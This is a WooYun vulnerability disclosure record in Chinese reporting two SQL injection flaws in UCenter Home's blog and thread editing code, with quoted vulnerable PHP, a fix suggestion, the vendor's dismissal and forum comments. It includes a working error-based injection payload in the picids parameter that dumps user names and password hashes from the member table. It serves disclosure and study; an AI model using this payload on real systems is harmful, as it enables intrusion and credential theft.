{"id": 546, "wybug_id": "wooyun-2014-069690", "wybug_title": "Ucenter Home最新版SQL注入两处", "wybug_corp": "Discuz!", "wybug_author": "xfkxfk", "wybug_date": "2014-07-25 17:48", "wybug_open_date": "2014-10-20 17:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向公众公开  简要描述： Ucenter Home最新版SQL注入两处，比较隐蔽 详细说明：  在编辑日志处文件cp_blog.php：\n//添加编辑操作if(submitcheck('blogsubmit')) {\tif(empty($blog['blogid'])) {\t\t$blog = array();\t} else {\t\tif(!checkperm('allowblog')) {\t\t\tckspacelog();\t\t\tshowmessage('no_authority_to_add_log');\t\t}\t}\t\t//验证码\tif(checkperm('seccode') && !ckseccode($_POST['seccode'])) {\t\tshowmessage('incorrect_code');\t}\t\tinclude_once(S_ROOT.'./source/function_blog.php');\tif($newblog = blog_post($_POST, $blog)) {\t\tif(empty($blog) && $newblog['topicid']) {\t\t\t$url = 'space.php?do=topic&topicid='.$newblog['topicid'].'&view=blog';\t\t} else {\t\t\t$url = 'space.php?uid='.$newblog['uid'].'&do=blog&id='.$newblog['blogid'];\t\t}\t\tshowmessage('do_success', $url, 0);\t} else {\t\tshowmessage('that_should_at_least_write_things');\t}}\n注意这里的$newblog = blog_post($_POST, $blog)更新内容应该是在blog_post函数，跟进。文件function_blof.php：\n//添加博客function blog_post($POST, $olds=array()) {\tglobal $_SGLOBAL, $_SC, $space;\t\t//操作者角色切换\t$isself = 1;\tif(!empty($olds['uid']) && $olds['uid'] != $_SGLOBAL['supe_uid']) {\t\t$isself = 0;\t\t$__SGLOBAL = $_SGLOBAL;\t\t$_SGLOBAL['supe_uid'] = $olds['uid'];\t\t$_SGLOBAL['supe_username'] = addslashes($olds['username']);\t}......//获取上传的图片\t$uploads = array();\tif(!empty($POST['picids'])) {\t\t$picids = array_keys($POST['picids']);\t\tprint_r($picids);\t\t$query = $_SGLOBAL['db']->query(\"SELECT * FROM \".tname('pic').\" WHERE picid IN (\".simplode($picids).\") AND uid='$_SGLOBAL[supe_uid]'\");\t\twhile ($value = $_SGLOBAL['db']->fetch_array($query)) {\t\t\tif(empty($titlepic) && $value['thumb']) {\t\t\t\t$titlepic = $value['filepath'].'.thumb.jpg';\t\t\t\t$blogarr['picflag'] = $value['remote']?2:1;\t\t\t}\t\t\t$uploads[$POST['picids'][$value['picid']]] = $value;\t\t}\t\tif(empty($titlepic) && $value) {\t\t\t$titlepic = $value['filepath'];\t\t\t$blogarr['picflag'] = $value['remote']?2:1;\t\t}\t}\n在获取上传图片时，看这里的关键代码：\n$picids = array_keys($POST['picids']);\t\t$query = $_SGLOBAL['db']->query(\"SELECT * FROM \".tname('pic').\" WHERE picid IN (\".simplode($picids).\") AND uid='$_SGLOBAL[supe_uid]'\");\n$picids = array_keys($POST['picids'])，获取了picids的数组的全部键值然后picdis进入了SQL，这里导致了SQL注入。第二处SQL注入文件cp_thread.php\nif(submitcheck('threadsubmit')) {\t$tid = $_POST['tid'] = intval($_POST['tid']);\t$tagid = empty($_POST['tagid'])?0:intval($_POST['tagid']);\t\tif($eventid && $event['tagid']!=$tagid) {\t\tshowmessage('event_mtag_not_match');\t}\t......//省略\t//获取上传的图片\t$uploads = array();\tif(!empty($_POST['picids'])) {\t\t$picids = array_keys($_POST['picids']);\t\t$query = $_SGLOBAL['db']->query(\"SELECT * FROM \".tname('pic').\" WHERE picid IN (\".simplode($picids).\") AND uid='$_SGLOBAL[supe_uid]'\");\t\twhile ($value = $_SGLOBAL['db']->fetch_array($query)) {\t\t\tif(empty($titlepic) && $value['thumb']) {\t\t\t\t$titlepic = pic_get($value['filepath'], $value['thumb'], $value['remote']);\t\t\t}\t\t\t$uploads[$_POST['picids'][$value['picid']]] = $value;\t\t}\t\tif(empty($titlepic) && $value) {\t\t\t$titlepic = pic_get($value['filepath'], $value['thumb'], $value['remote']);\t\t}\t}\n通用先获取了$_POST['picids']的值，然后直接进入了SQL语句，导致SQL注入漏洞证明同第一处SQL注入。   漏洞证明：  1、发表一篇日志2、编辑日志3、在编辑日志是，上传图片：\n\n4、然后保存是，抓包，修改POST数据：修改picids[3]为：\npicids[3',(select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(username, 0x23, password) from uchome_member limit 0,1))a from information_schema.tables group by a)b))#]\"\n\n\n最后执行的sql语句为：\nSELECT * FROM uchome_pic WHERE picid IN ('3',(select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(username, 0x23, password) from uchome_member limit 0,1))a from information_schema.tables group by a)b))#','4') AND uid='2'\n然后看返回：\n\n\n\n   修复方案：  进行array_keys后，对获取的keys也进行处理。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-20 17:50 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-25 18:02 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  xfkxfk感觉好屌的样子，求认识。    \n     2014-07-25 21:16 |    \t\t滨湖虎子 \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:6        | 阿弥陀佛)\t\t \n  已经重复了，早就有人提交过。    \n     2014-07-25 22:37 |    \t\t好好吃饭天天向上 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 漏洞是什么！？)\t\t \n  @滨湖虎子 虎哥怎么知道重复了啊，膜拜。要是重复审核不会过吧？求漏洞详情啊，嘿嘿    \n     2014-07-25 23:26 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @好好吃饭天天向上 @滨湖虎子  哈哈 应该360上一周之前就发了 只是dz一直不去360确认 还一直在乌云上确认     \n     2014-07-25 23:26 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n   - - 应该改成因为  打错字。    \n     2014-07-26 00:16 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  一群大神都在这个漏洞露脸了，菜逼能露一个吗？    \n     2014-07-29 23:58 |    \t\tMoo \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | PS：不打脸，还要泡妞呢)\t\t \n  @滨湖虎子 老乡，求搭讪    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}